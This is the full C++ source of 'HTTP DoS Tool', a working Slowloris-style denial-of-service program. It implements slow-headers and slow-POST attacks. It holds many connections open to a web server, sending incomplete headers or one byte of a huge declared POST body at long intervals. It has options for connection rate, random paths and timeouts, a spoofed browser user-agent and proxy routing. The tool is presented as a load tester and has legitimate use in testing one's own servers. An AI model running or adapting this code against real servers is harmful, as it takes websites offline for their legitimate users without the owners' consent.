// Copyright (c) 2010, PROACTIVE RISK - http://www.proactiverisk.com
//
// This file is part of HTTP DoS Tool.
//
// HTTP Dos Tool is free software: you can redistribute it and/or modify it
// under the terms of the GNU General Public License as published by the Free
// Software Foundation, either version 3 of the License, or (at your option) any
// later version.
//
// Foobar is distributed in the hope that it will be useful, but WITHOUT ANY
// WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR
// A PARTICULAR PURPOSE.  See the GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along with
// HTTP DoS Tool.  If not, see <http://www.gnu.org/licenses/>.

#ifdef PLAT_LINUX
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <netdb.h>
#elif defined(PLAT_WIN32)
#include <winsock2.h>
#include <windns.h>
#endif

#include <sys/types.h>
#include <signal.h>
#include <event.h>
#include <errno.h>
#include <getopt.h>
#include <stdint.h>

#include <cstdlib>
#include <cstring>
#include <memory>
#include <set>
#include <stdexcept>
#include <string>
#include <sstream>
#include <iostream>

// -------------------------------------------------------------------------
// Socket support

struct SocketSetupGuard
{
  SocketSetupGuard() {
#ifdef PLAT_WIN32
    WSADATA wsa_data;
    int err = WSAStartup(0x202, &wsa_data);
    if (err != 0) {
      std::ostringstream oss;
      oss <<  "Fatal error initialising WinSock library: "
          "could not load version 2.2 with error: " << err;
      throw std::runtime_error(oss.str());
    }
#else
    signal(SIGPIPE, SIG_IGN);
#endif
  }
  ~SocketSetupGuard() {
#ifdef PLAT_WIN32
    WSACleanup();
#endif
  }
};

void throw_socket_error(const std::string& str)
{
  std::ostringstream oss;
  
  oss << str;

  int error;
#ifdef PLAT_LINUX
  error = errno;
  
  oss << "() failed: error " << error;

  char errbuf[2048];
  if (strerror_r(error, errbuf, sizeof(errbuf)) == 0) {
    oss << ": " << errbuf;
  }
#else
  error = WSAGetLastError();
  oss << "() failed: error " << error;
#endif

  throw std::runtime_error(oss.str());
}

struct timeval float_to_timeval(double f)
{
  struct timeval timeout;

  timeout.tv_sec = (int)(f);
  timeout.tv_usec = (int)((f - (double)timeout.tv_sec) * 1000000.0);

  return timeout;
}

// -------------------------------------------------------------------------

struct BufferEventGuard
{
  BufferEventGuard() : buf_(NULL) {}

  void init(struct bufferevent* buf) {
    buf_ = buf;
    if (!buf_)
      throw std::runtime_error("Fatal error: bufferevent_new() failed?");
  }
  ~BufferEventGuard() {
    if (buf_) {
      bufferevent_disable(buf_, EV_READ | EV_WRITE);
      bufferevent_free(buf_);
    }
  }
  struct bufferevent* get() { return buf_; }
private:
  struct bufferevent* buf_;

  BufferEventGuard(const BufferEventGuard& b) {}
};

// -------------------------------------------------------------------------

struct Options {
  std::string   host_;
  uint32_t      host_addr_;   // Network byte order
  uint16_t      host_port_;   // Network byte order
  std::string   user_agent_;
  enum {
    RUN_SLOW_HEADERS, RUN_SLOW_POST 
  }             run_;
  int           connections_;
  int           rate_;
  double        timeout_;
  bool          post_;
  bool          random_path_;
  std::string   post_field_;
  int           log_connection_;
  int           post_content_length_;
  std::string   path_;
  double        report_interval_;
  bool          random_payload_;
  bool          random_post_content_length_;
  bool          random_timeout_;
  std::string   proxy_;
  uint32_t      proxy_addr_;   // Network byte order
  uint16_t      proxy_port_;   // Network byte order

  Options()
    : host_("localhost"),
      host_addr_(inet_addr("127.0.0.1")),
      host_port_(htons(80)),
      user_agent_("Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; "
          "Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; "
          ".NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)"),
      run_(RUN_SLOW_HEADERS),
      connections_(100),
      rate_(10000),
      timeout_(100.0),
      post_(false),
      random_path_(false),
      post_field_(),
      log_connection_(-1),
      post_content_length_(1000000),
      path_("index.html"),
      report_interval_(1.0),
      random_payload_(false),
      random_post_content_length_(false),
      random_timeout_(false),
      proxy_(),
      proxy_addr_(0),
      proxy_port_(htons(80))
    {}
};

uint32_t dns_resolve(const std::string& str)
{
#ifdef PLAT_WIN32
  PDNS_RECORD pDnsRecord, iter;

  DNS_STATUS status = DnsQuery(
      str.c_str(),
      DNS_TYPE_A,
      DNS_QUERY_STANDARD,
      NULL,
      &pDnsRecord,
      NULL);

  if (status) {
    std::ostringstream oss;
    oss << "Failed to look up DNS for '" << str << "'.";
    throw std::runtime_error(oss.str());
  }

  // Skip over e.g. CNAMEs
  iter = pDnsRecord;
  while (iter && iter->wType != DNS_TYPE_A) {
    iter = iter->pNext;
  }

  uint32_t return_val;

  if (iter) {
    return_val = iter->Data.A.IpAddress;
  }

  DnsRecordListFree(pDnsRecord, DnsFreeRecordList);

  if (!iter) {
    std::ostringstream oss;
    oss << "Failed to look up DNS for '" << str << "': no "
      << "'A' record was returned by the server.";
    throw std::runtime_error(oss.str());
  }

  return return_val;
#else
  struct addrinfo hints;
  memset(&hints, 0, sizeof(hints));

  hints.ai_family = AF_INET;  // IPv4 only for now
  hints.ai_socktype = SOCK_DGRAM;
  hints.ai_flags = AI_PASSIVE;
  hints.ai_protocol = 0;
  hints.ai_canonname = NULL;
  hints.ai_addr = NULL;
  hints.ai_next = NULL;

  struct addrinfo *result, *rp;
  int s = ::getaddrinfo(str.c_str(), NULL, &hints, &result);
  if (s != 0) {
    std::ostringstream oss;
    oss << "Failed to look up DNS for '" << str << "': "
        << gai_strerror(s);
    throw std::runtime_error(oss.str());
  }

  uint32_t return_val = 0;

  for (rp = result; rp && !rp->ai_addr; rp = rp->ai_next)
    ;

  if (rp) {
    struct sockaddr_in *sockin = reinterpret_cast<struct sockaddr_in*>(
        rp->ai_addr);
    return_val = sockin->sin_addr.s_addr;
  }

  ::freeaddrinfo(result);

  if (!return_val) {
    std::ostringstream oss;
    oss << "No valid IPv4 addresses for '" << str << "'.";
    throw std::runtime_error(oss.str());
  }

  return return_val;
#endif
}

// -------------------------------------------------------------------------

class SlowHeadersHttpConnection;

class Controller {
public:
  explicit Controller(const Options& opts);

  void report();
  void start_next_connection(void);
  void report_connection_error(class SlowHeadersHttpConnection* c);
  void report_connected(class SlowHeadersHttpConnection* c);

  const Options& get_options() const { return opts_; }
  struct event_base* get_event_base() const { return event_base_; }

private:
  typedef std::set<class SlowHeadersHttpConnection*> ConnectionSet;

  static void report_cb(int fd, short what, void* arg);
  static void start_next_connection_cb(int fd, short what, void* arg);

  const Options&  opts_;
  struct event_base *event_base_;
  ConnectionSet   connections_;
  int             num_connections_started_;
  int             num_connections_errored_;
  int             num_connections_connected_;
  int             num_connections_failed_startup_;
  std::auto_ptr<struct event>  report_event_;
  std::auto_ptr<struct event>  conn_event_;

};

class SlowHeadersHttpConnection {
public:
  SlowHeadersHttpConnection(Controller&, bool log);

  void send_partial_get_header();
  void send_post_header();
  bool get_logging() const { return logging_; }
  bool get_connected() const { return connected_; }

private:
  Controller&                   controller_;
  int                           socket_;
  BufferEventGuard              buf_;
  std::auto_ptr<struct event>   event_;
  bool                          logging_;
  bool                          connected_;

  static void buf_event_read_cb(struct bufferevent* be, void* arg);
  static void buf_event_write_cb(struct bufferevent* be, void* arg);
  static void buf_event_event_cb(struct bufferevent* be, short what, void* arg);
  static void send_next_header_part_cb(int, short, void*);
  static void send_next_post_part_cb(int, short, void*);

  void event_read();
  void event_write();
  void event_event(int what);
  void send_next_header_part();
  void send_next_post_part();
  void schedule_next_send();
  void buf_write(const char* data, size_t size);
  void log_lines(const char* header, const char* data, int size);
};

Controller::Controller(const Options& opts)
  : opts_(opts),
    num_connections_started_(0),
    num_connections_errored_(0),
    num_connections_connected_(0),
    num_connections_failed_startup_(0)
{
  event_base_ = event_base_new();  // TODO: consider new_with_config and request the right type of libevent support
}

void Controller::report_cb(int fd, short what, void* arg)
{
  reinterpret_cast<Controller*>(arg)->report();
}

void Controller::start_next_connection_cb(int fd, short what, void* arg)
{
  reinterpret_cast<Controller*>(arg)->start_next_connection();
}

void Controller::report()
{
  std::cout
    << "CONNECTIONS:"
    << " target: " << get_options().connections_
    << " started: " << num_connections_started_
    << " active: " << connections_.size()
    << " connected: " << num_connections_connected_
    << " error: " << num_connections_errored_
    << " startup-fail: " << num_connections_failed_startup_
    << std::endl;

  struct timeval timeout = float_to_timeval(get_options().report_interval_);
  report_event_.reset(new event);

  evtimer_assign(report_event_.get(), get_event_base(),
      &Controller::report_cb, this);
  evtimer_add(report_event_.get(), &timeout);
}

void Controller::start_next_connection()
{
  if (num_connections_started_ < opts_.connections_) {
    num_connections_started_++;
    try {
      bool logging = false;
      if (num_connections_started_ == opts_.log_connection_) {
        logging = true;
      }
      SlowHeadersHttpConnection* c = new SlowHeadersHttpConnection(
          *this, logging);
      connections_.insert(c);
    } catch (const std::exception& e) {
      report_connection_error(NULL);
    }

    struct timeval timeout;

    if (opts_.rate_ > 1000) {
      timeout.tv_sec = 0;
      timeout.tv_usec = 0;
    } else if (opts_.rate_ > 1) {
      timeout.tv_sec = 0;
      timeout.tv_usec = 1000000 / opts_.rate_;
    } else {
      timeout.tv_sec = 1;
      timeout.tv_usec = 0;
    }

    conn_event_.reset(new event);
    evtimer_assign(conn_event_.get(), get_event_base(), 
        &Controller::start_next_connection_cb,
        this);
    evtimer_add(conn_event_.get(), &timeout);
  }
}

void Controller::report_connection_error(
    class SlowHeadersHttpConnection* c)
{
  if (c) {
    ConnectionSet::iterator i = connections_.find(c);
    if (i != connections_.end()) {
      if (c->get_logging()) {
        std::cout << "EVENT_DISCONNECTED:" << std::endl;
      }
      num_connections_errored_++;
      if (c->get_connected())
        num_connections_connected_--;
      connections_.erase(i);
      delete c;
    }
  } else {
    num_connections_failed_startup_++;
  }

  if (connections_.empty() &&
      num_connections_started_ == opts_.connections_) {
    // Nothing left, and nothing more to create.
    event_base_loopbreak(get_event_base());
  }
}

void Controller::report_connected(class SlowHeadersHttpConnection* c)
{
  if (c) {
    ConnectionSet::iterator i = connections_.find(c);
    if (i != connections_.end()) {
      num_connections_connected_++;
    }
  }
}

SlowHeadersHttpConnection::SlowHeadersHttpConnection(Controller& shc, bool log)
  : controller_(shc), logging_(log), connected_(false)
{
  socket_ = ::socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (socket_ == -1) {
    throw_socket_error("socket");
  }

  evutil_make_socket_nonblocking(socket_);

  buf_.init(bufferevent_socket_new(controller_.get_event_base(), socket_,
        BEV_OPT_CLOSE_ON_FREE));
  if (!buf_.get()) {
    throw std::runtime_error("Could not create new bufferevent: out of "
        "memory?");
  }

  bufferevent_setcb(buf_.get(),
      &SlowHeadersHttpConnection::buf_event_read_cb,
      &SlowHeadersHttpConnection::buf_event_write_cb,
      &SlowHeadersHttpConnection::buf_event_event_cb,
      this);
  bufferevent_enable(buf_.get(), EV_READ|EV_WRITE);

  const Options& opts = shc.get_options();
  struct sockaddr_in addr;

  addr.sin_family       = AF_INET;

  if (opts.proxy_addr_) {
    addr.sin_addr.s_addr  = opts.proxy_addr_;
    addr.sin_port         = opts.proxy_port_;
  } else {
    addr.sin_addr.s_addr  = opts.host_addr_;
    addr.sin_port         = opts.host_port_;
  }

  if (logging_) {
    std::cout << "EVENT_CONNECTING: " << inet_ntoa(addr.sin_addr)
      << ":" << ntohs(addr.sin_port) << std::endl;
  }

  if (bufferevent_socket_connect(buf_.get(),
        reinterpret_cast<struct sockaddr*>(&addr), sizeof(addr)) != 0) {
    throw std::runtime_error("Got error in bufferevent_socket_new(): should "
        "not fail here.");
  }
}

void SlowHeadersHttpConnection::buf_event_read_cb(struct bufferevent* be, void* arg)
{
  reinterpret_cast<SlowHeadersHttpConnection*>(arg)->event_read();
}

void SlowHeadersHttpConnection::buf_event_write_cb(struct bufferevent* be, void* arg)
{
  reinterpret_cast<SlowHeadersHttpConnection*>(arg)->event_write();
}

void SlowHeadersHttpConnection::buf_event_event_cb(struct bufferevent* be, short what, void* arg)
{
  reinterpret_cast<SlowHeadersHttpConnection*>(arg)->event_event(what);
}

void SlowHeadersHttpConnection::send_next_header_part_cb(int fd, short what, void* arg)
{
  reinterpret_cast<SlowHeadersHttpConnection*>(arg)->send_next_header_part();
}

void SlowHeadersHttpConnection::send_next_post_part_cb(int fd, short what, void* arg)
{
  reinterpret_cast<SlowHeadersHttpConnection*>(arg)->send_next_post_part();
}

void SlowHeadersHttpConnection::event_read()
{
  char data[10000];
  int size = bufferevent_read(buf_.get(), data, sizeof(data) - 1);
  data[size] = '\0';

  if (logging_) {
    log_lines("READ:", data, size);
  }
}

void SlowHeadersHttpConnection::event_write()
{
}

void SlowHeadersHttpConnection::event_event(int what)
{
  if (what & BEV_EVENT_CONNECTED) {
    connected_ = true;

    controller_.report_connected(this);

    if (logging_) {
      std::cout << "EVENT_CONNECTED:" << std::endl;
    }

    if (controller_.get_options().run_ == Options::RUN_SLOW_HEADERS) {
      send_partial_get_header();
    } else {
      send_post_header();
    }
  }

  if (what & (BEV_EVENT_ERROR | BEV_EVENT_EOF)) {
    if (event_.get()) {
      event_del(event_.get());
      event_.reset();
    }

    controller_.report_connection_error(this);
  }
}

void SlowHeadersHttpConnection::log_lines(const char* header, const char* data, int size)
{
  const char *n = data;
  while (true) {
    const char* eol = strchr(n, '\n');

    if (!eol) {
      std::cout << header << "0 " << n << std::endl;
      return;
    } else {
      std::string s(n, eol - n);
      std::cout << header << "1 " << s << std::endl;
      n = eol + 1;
    }
  }
}

void SlowHeadersHttpConnection::buf_write(const char* data, size_t size)
{
  if (logging_) {
    log_lines("WRITE:", data, size);
  }
  bufferevent_write(buf_.get(), data, size);
}

void SlowHeadersHttpConnection::schedule_next_send()
{
  double interval = controller_.get_options().timeout_;

  if (controller_.get_options().random_timeout_) {
    interval *= (double)rand() / (double)RAND_MAX;
  }

  struct timeval timeout = float_to_timeval(interval);

  event_.reset(new event);
  if (controller_.get_options().run_ == Options::RUN_SLOW_HEADERS) {
    evtimer_assign(event_.get(), controller_.get_event_base(), 
        &SlowHeadersHttpConnection::send_next_header_part_cb,
        this);
  } else {
    evtimer_assign(event_.get(), controller_.get_event_base(), 
        &SlowHeadersHttpConnection::send_next_post_part_cb,
        this);
  }
  evtimer_add(event_.get(), &timeout);
}

void SlowHeadersHttpConnection::send_partial_get_header()
{
  const Options& opts = controller_.get_options();

  std::string user_agent = opts.user_agent_;
  std::string host = opts.host_;
  std::string path = opts.path_;
  std::string req = opts.post_ ? "POST" : "GET";
  std::string base_path = "/";

  if (opts.proxy_addr_) {
    std::ostringstream oss;
    oss << "http://" << opts.host_ << ":" << ntohs(opts.host_port_) << "/";
    base_path = oss.str();
  }

  if (opts.random_path_) {
    std::ostringstream oss;
    oss << rand();
    path = oss.str();
  }

  if (path[0] == '/') {
    path = path.substr(1, path.size() - 1);
  }

  std::ostringstream oss;
  oss
    << req << " " << base_path << path << " HTTP/1.1\r\n"
    << "Host: " << host << "\r\n"
    << "User-Agent: " << user_agent << "\r\n"
    << "Content-Length: " << 42 << "\r\n"
    ; // Don't finish headers here! Deliberate.

  const std::string& s = oss.str();
  buf_write(s.c_str(), s.size());

  schedule_next_send();
}

void SlowHeadersHttpConnection::send_post_header()
{
  const Options& opts = controller_.get_options();

  std::string user_agent = opts.user_agent_;
  std::string host = opts.host_;
  std::string path = opts.path_;
  int content_length = opts.post_content_length_;
  std::string base_path = "/";

  if (opts.proxy_addr_) {
    std::ostringstream oss;
    oss << "http://" << opts.host_ << ":" << ntohs(opts.host_port_) << "/";
    base_path = oss.str();
  }

  if (opts.random_post_content_length_) {
    content_length = 1 + (rand() % content_length);
  }

  if (opts.random_path_) {
    std::ostringstream oss;
    oss << rand();
    path = oss.str();
  }

  if (path[0] == '/') {
    path = path.substr(1, path.size() - 1);
  }

  std::ostringstream oss;
  oss
    << "POST " << base_path << path << " HTTP/1.1\r\n"
    << "Host: " << host << "\r\n"
    << "User-Agent: " << user_agent << "\r\n"
    << "Connection: keep-alive\r\n"
    << "Content-Length: " << content_length << "\r\n"
    << "Content-Type: application/x-www-form-urlencoded\r\n"
    << "\r\n";

  if (!opts.post_field_.empty())
    oss << opts.post_field_ << "=";

  const std::string& s = oss.str();
  buf_write(s.c_str(), s.size());

  schedule_next_send();
}

void SlowHeadersHttpConnection::send_next_header_part()
{
  std::ostringstream oss;
  oss << "Pragma: " << rand() % 100000 << "\r\n";
  const std::string& s = oss.str();

  buf_write(s.c_str(), s.size());

  schedule_next_send();
}

void SlowHeadersHttpConnection::send_next_post_part()
{
  char s[2] = {
    controller_.get_options().random_payload_ ?
      'a' + rand() % ('z' - 'a') : 'A',
    '\0'
  };

  buf_write(s, 1);

  schedule_next_send();
}

// -------------------------------------------------------------------------

void usage()
{
  std::cout <<
"HTTP load tester for slow headers and slow POST attacks.\n"
"Version: 1.1\n"
"Usage:\n"
"  --host <dns_name_of_webserver>\n"
"      Web server to connect to (just DNS, no URI). Defaults to localhost.\n"
"  --port <port number>\n"
"      Port number of web server to connect to (default 80).\n"
"  --proxy <dns_name_of_proxy>\n"
"      If set, proxy HTTP requests through the supplied server.\n"
"  --proxy-port <port number>\n"
"      Port of the proxy server. Only used if --proxy is set.\n"
"  --slow-headers\n"
"      Run slow-headers attack.\n"
"  --slow-post\n"
"      Run slow-post attack.\n"
"  --connections <num>\n"
"      Number of connections to spawn.\n"
"  --rate <num>\n"
"      Number of connections to create per second. If set to 1000 or greater,\n"
"      will create connections as fast as possible.\n"
"  --timeout <num>\n"
"      Timeout, in seconds, between each write of header data or POST data.\n"
"      Defaults to 100 seconds, and may include fractional seconds, e.g. 1.5\n"
"      for one and a half seconds.\n"
"  --random-timeout\n"
"      Randomise the timeout. Interval is between 0 and the --timeout option.\n"
"  --path <path>\n"
"      Path specified in the GET or POST request. This defaults to index.html.\n"
"  --random-path\n"
"      Randomise the path specified in the GET or POST request. This overrides\n"
"      the --path option.\n"
"  --report-interval <num>\n"
"      Interval (in seconds) between each report of statistics. This defaults\n"
"      to 1.0.\n"
"  --log-connection <num>\n"
"      Print out diagnostic information about a single connection: all data\n"
"      transferred will be printed out. The number specified is the number of\n"
"      the created connection, starting at one. For example, if 1 is specified\n"
"      the first connection created will have it's information printed.\n"
"  --user-agent <string>\n"
"      The user-agent specified in the HTTP headers. Defaults to: \n"
"        Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; \n"
"        Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; \n"
"        .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\n"
"  --seed <num>\n"
"      Seed the random number generator with the specified seed. This can be\n"
"      used to help build reproducible tests or guarantee different sequences\n"
"      of random data. In general this option does not need to be specified.\n"
"\n"
"slow-headers specific options:\n"
"  --post\n"
"      Use POST rather than GET.\n"
"\n"
"slow-post specific options:\n"
"  --post-content-length <num>\n"
"      The value of the 'Content-length' header. Defaults to 1000000.\n"
"  --random-post-content-length\n"
"      Randomise the post content length. The interval is between 1 and the\n"
"      value of the post-content-length option.\n"
"  --random-payload\n"
"      Randomise any payload written in the attack. Without this, the character\n"
"      'A' is written as the payload.\n"
"  --post-field <string>\n"
"      If specified, the body of the post attack will start as 'post-field='\n"
"      then any data will follow. Without this option specified, the data in\n"
"      the post is sent raw without any prefix.\n"
"\n"
"  --help         : Show this usage statement\n"
;
}

void parse_options(Options* opts, int argc, char* argv[])
{
  enum {
    OPT_HOST = 1000, OPT_PORT, OPT_SLOW_HEADERS, OPT_SLOW_POST,
    OPT_CONNECTIONS, OPT_RATE, OPT_TIMEOUT, OPT_POST,
    OPT_RANDOM_PATH, OPT_LOG_CONNECTION, OPT_POST_CONTENT_LENGTH,
    OPT_PATH, OPT_REPORT_INTERVAL, OPT_RANDOM_PAYLOAD,
    OPT_RANDOM_POST_CONTENT_LENGTH, OPT_RANDOM_TIMEOUT, OPT_SEED,
    OPT_USER_AGENT, OPT_POST_FIELD, OPT_PROXY, OPT_PROXY_PORT,
    OPT_HELP
  };

  static struct option long_options[] = {
    { "host", 1, 0, OPT_HOST },
    { "port", 1, 0, OPT_PORT },
    { "slow-headers", 0, 0, OPT_SLOW_HEADERS },
    { "slow-post", 0, 0, OPT_SLOW_POST },
    { "connections", 1, 0, OPT_CONNECTIONS },
    { "rate", 1, 0, OPT_RATE },
    { "timeout", 1, 0, OPT_TIMEOUT },
    { "post", 0, 0, OPT_POST },
    { "random-path", 0, 0, OPT_RANDOM_PATH },
    { "log-connection", 1, 0, OPT_LOG_CONNECTION },
    { "post-content-length", 1, 0, OPT_POST_CONTENT_LENGTH },
    { "path", 1, 0, OPT_PATH },
    { "report-interval", 1, 0, OPT_REPORT_INTERVAL },
    { "random-payload", 0, 0, OPT_RANDOM_PAYLOAD },
    { "random-post-content-length", 0, 0, OPT_RANDOM_POST_CONTENT_LENGTH },
    { "random-timeout", 0, 0, OPT_RANDOM_TIMEOUT },
    { "user-agent", 1, 0, OPT_USER_AGENT },
    { "post-field", 1, 0, OPT_POST_FIELD },
    { "proxy", 1, 0, OPT_PROXY },
    { "proxy-port", 1, 0, OPT_PROXY_PORT },
    { "seed", 1, 0, OPT_SEED },
    { "help", 0, 0, 'h' },
    { 0, 0, 0, 0 }
  };

  while (1) {
    int option_index = 0;

    int c = getopt_long(argc, argv, "h", long_options, &option_index);
    if (c == -1)
      break;

#define INT_ARG(e, name)    case e: opts->name = atoi(optarg); break
#define FLOAT_ARG(e, name)  case e: opts->name = atof(optarg); break
#define GENERIC_ARG(e, name, val) case e: opts->name = val; break
#define BOOL_ARG(e, name)   case e: opts->name = true; break
#define STRING_ARG(e, name) case e: opts->name = optarg; break
#define HOST_ARG(e, name, ip_name) case e: opts->name = optarg; \
    opts->ip_name = dns_resolve(opts->name); break;

  switch (c) {
    case 'h':
      usage();
      exit(EXIT_SUCCESS);

    case OPT_SEED:
      srand(atoi(optarg));
      break;

    HOST_ARG(OPT_HOST, host_, host_addr_);
    GENERIC_ARG(OPT_PORT, host_port_, htons(atoi(optarg)));
    GENERIC_ARG(OPT_SLOW_HEADERS, run_, Options::RUN_SLOW_HEADERS);
    GENERIC_ARG(OPT_SLOW_POST, run_, Options::RUN_SLOW_POST);
    INT_ARG(OPT_CONNECTIONS, connections_);
    INT_ARG(OPT_RATE, rate_);
    FLOAT_ARG(OPT_TIMEOUT, timeout_);
    BOOL_ARG(OPT_POST, post_);
    BOOL_ARG(OPT_RANDOM_PATH, random_path_);
    INT_ARG(OPT_LOG_CONNECTION, log_connection_);
    INT_ARG(OPT_POST_CONTENT_LENGTH, post_content_length_);
    STRING_ARG(OPT_PATH, path_);
    FLOAT_ARG(OPT_REPORT_INTERVAL, report_interval_);
    BOOL_ARG(OPT_RANDOM_PAYLOAD, random_payload_);
    BOOL_ARG(OPT_RANDOM_POST_CONTENT_LENGTH, random_post_content_length_);
    BOOL_ARG(OPT_RANDOM_TIMEOUT, random_timeout_);
    STRING_ARG(OPT_USER_AGENT, user_agent_);
    STRING_ARG(OPT_POST_FIELD, post_field_);
    HOST_ARG(OPT_PROXY, proxy_, proxy_addr_);
    GENERIC_ARG(OPT_PROXY_PORT, proxy_port_, htons(atoi(optarg)));

#undef HOST_ARG
#undef STRING_ARG
#undef BOOL_ARG
#undef GENERIC_ARG
#undef FLOAT_ARG
#undef INT_ARG

    case '?':
      throw std::runtime_error("Invalid command-line option.");
      break;

    default:
      throw std::runtime_error("getopt returned character ??");
      break;
    }
  }
}

void run(const Options& opts)
{
  Controller controller(opts);

  controller.report();
  controller.start_next_connection();

  event_base_loop(controller.get_event_base(), 0);

  controller.report();
  std::cout << "FINISHED." << std::endl;
}

int main(int argc, char* argv[])
{
  try {
    Options opts;

    parse_options(&opts, argc, argv);

    SocketSetupGuard sock_guard;
    event_init();

    run(opts);
  } catch (const std::exception& e) {
    std::cerr << "ERROR: Caught fatal exception: " << e.what() << std::endl;
    return 1;
  } catch (...) {
    std::cerr << "ERROR: Caught unknown exception." << std::endl;
    return 2;
  }

  return 0;
}